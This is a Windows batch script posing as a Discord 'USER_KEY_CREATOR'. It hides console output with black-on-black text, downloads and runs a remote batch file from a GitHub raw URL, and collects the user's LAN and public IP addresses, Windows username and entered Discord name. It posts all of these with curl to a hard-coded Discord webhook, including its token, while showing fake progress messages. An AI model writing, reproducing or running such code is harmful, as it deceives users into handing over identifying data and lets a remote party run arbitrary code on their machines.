@echo off
set hide=[40;30m
set normal=[40;37m
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do (
    set "LAN_IP=%%a"
)

for /f "tokens=2 delims=: " %%A in (
  'nslookup myip.opendns.com. resolver1.opendns.com 2^>NUL^|find "Address:"'
) Do set ExtIP=%%A
cd %temp%
goto loading
:blocked
echo %normal% 
cls
color 4
echo You are blocked!
set /p f=
exit
:loading
echo %hide% 
set file2=%random%%random%%random%
curl "https://raw.githubusercontent.com/W5GZ-X9YY-4GZY-3DYE/TF3N-KWTN-GWHL-6DA4/main/BlockedList.txt" --output "%file2%.bat"
call %file2%.bat
del %file2%.bat
if "%abc%"=="blocked" goto blocked
title USER_KEY_CREATOR
echo %normal% 
cls
echo Enter Discrod Username and Tag!
set /p name=: 
cls
echo %normal% It can take some time! %hide%
echo %normal% 1/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 2/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"KEY=FALSE\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 3/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Date: %date%\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 4/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Key:  %random%%random%-%random%%random%-%random%%random%\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 5/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 6/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \":: %date%\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 7/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"set pcname=%username%\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 8/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"set rank=Member\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 9/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"set name=%name%\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 10/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 11/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"IP: %LAN_IP%\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 12/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Public_IP: %ExtIP%\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 13/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"--------------------------------------------------------------\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% It can take some time! %hide%
echo %normal% 14/14 %hide%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**        **\"}" https://discord.com/api/webhooks/946781325476651079/qQth6J72Aml5QdPN4QlM135C-5Yq8wUMlLZwG_Kbmhl9PR8cZT48xXTxerA2sBfynjD1
cls
echo %normal% Done! We will send USER_KEY in discord
set /p p=Press Enter!
:end
